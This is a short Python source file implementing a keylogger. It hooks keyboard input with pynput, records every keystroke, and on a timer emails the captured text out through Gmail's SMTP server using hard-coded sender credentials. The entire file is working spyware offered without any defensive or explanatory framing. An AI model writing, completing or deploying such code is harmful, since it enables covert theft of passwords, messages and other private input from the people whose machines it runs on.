import pynput
import threading
import smtplib

# pip install pynput


class Keylogger:
  def __init__(self ,time ,email,password):
    self.stored_keys = " Keylogger Started "
    self.time = time
    self.email = email
    self.password = password

  def log (self,string):
    self.stored_keys = self.stored_keys + string
  
  def key_press(self ,key):
    try :
      current_key = str(key.char)
      print(self.stored_keys)
    except AttributeError:
      if key == key.space:
        current_key = " "
        print(self.stored_keys)
      else:
        current_key = " " + str(key) + " "
    self.log(current_key)
    
  def send_mail(self,email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()
  
  def report(self):
    self.send_mail(self.email,self.password, "\n\n"+self.stored_keys)
    print(self.stored_keys)
    self.stored_keys = ""
    timer = threading.Timer(self.time,self.report)
    timer.start()
    
  def start(self):
    keyboard_listener = pynput.keyboard.Listener(on_press =self.key_press)
    with keyboard_listener as Listener:
      self.report()
      Listener.join()




